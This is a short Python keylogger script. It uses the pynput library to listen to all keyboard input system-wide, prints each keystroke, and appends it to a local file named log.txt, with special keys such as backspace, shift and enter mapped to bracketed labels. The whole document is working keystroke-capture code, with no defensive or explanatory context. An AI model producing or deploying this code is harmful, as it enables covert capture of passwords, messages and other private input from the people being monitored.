from pynput import keyboard

def on_press(key):
    dic = {"Key.backspace":"[BACKSPACE]",
        "Key.tab":"[TAB]" ,
        "Key.caps_lock":"[CAPS_LOCK]",
        "Key.shift":"[SHIFT]",
        "Key.shift_r":"[SHIFT]",
        "Key.ctrl_r":"[CTRL]",
        "Key.ctrl_l":"[CTRL]",
        "Key.esc":"[ESC]",
        "Key.alt_l":"[ALT]",
        "Key.alt_gr":"[ALT]",
        "Key.cmd_r":"[CMD]",
        "Key.cmd":"[CMD]",
        "Key.menu":"[MENU]",
        "Key.enter":"[ENTER]",
        "Key.space":" "}

    try:                          # Regular Keys
        print(f'{key.char}')
        with open("log.txt", "a") as log:
            log.write(f"{key.char}")
            
    except AttributeError:        # Special Keys
        print(f'{key}')
        with open("log.txt", "a") as log:
            str_key = dic[f"{key}"]
            log.write(f"{str_key}")
       
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
